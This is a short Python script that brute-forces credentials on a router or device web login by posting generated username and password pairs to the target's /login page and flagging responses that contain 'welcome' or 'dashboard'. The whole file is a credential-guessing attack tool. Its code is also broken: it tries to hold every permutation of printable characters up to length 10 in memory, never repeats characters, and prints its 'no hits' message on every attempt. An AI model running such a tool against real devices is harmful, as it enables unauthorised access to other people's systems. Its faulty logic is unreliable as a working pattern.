"""
Explain vulnerability
"""

from argparse import ArgumentParser
from itertools import permutations
from string import printable

from requests import RequestException, post


def check_for_cred(ip: str):
    """
    Tries to brute force credentials
    """
    print("# Brute forcing for credentials...")

    MIN_LEN = 1
    MAX_LEN = 11
    usernames = []
    passwords = []
    for i in range(MIN_LEN, MAX_LEN):
        perm_lis = list(permutations(printable, i))
        for perm in perm_lis:
            perm = "".join(perm)
            usernames.append(perm)
            passwords.append(perm)

    no_hits = True
    for user in usernames:
        for password in passwords:
            try:
                res = post(
                    f"http://{ip}/login",
                    data={"username": user, "password": password},
                    timeout=5,
                )
                if res:
                    # Somtimes routers display "Welcome, Admin". Reason behind welcome
                    if "welcome" in res.text.lower():
                        print(f"- *Credential found!: {user}:{password}*")
                        no_hits = False

                    # Checks for status code 200
                    elif res.status_code == 200 and "dashboard" in res.text.lower():
                        print(f"- *Credential found!: {user}:{password}*")
                        no_hits = False

            except RequestException:
                continue

            if no_hits:
                print(
                    f"- No hits when brute forcing credentials with passwords of length {MIN_LEN} to {MAX_LEN}"
                )
            print()


if __name__ == "__main__":
    parser = ArgumentParser(prog="brute_force_creds")
    parser.add_argument("-ip", action="store", type=str)
    args = parser.parse_args()
    check_for_cred(args.ip)
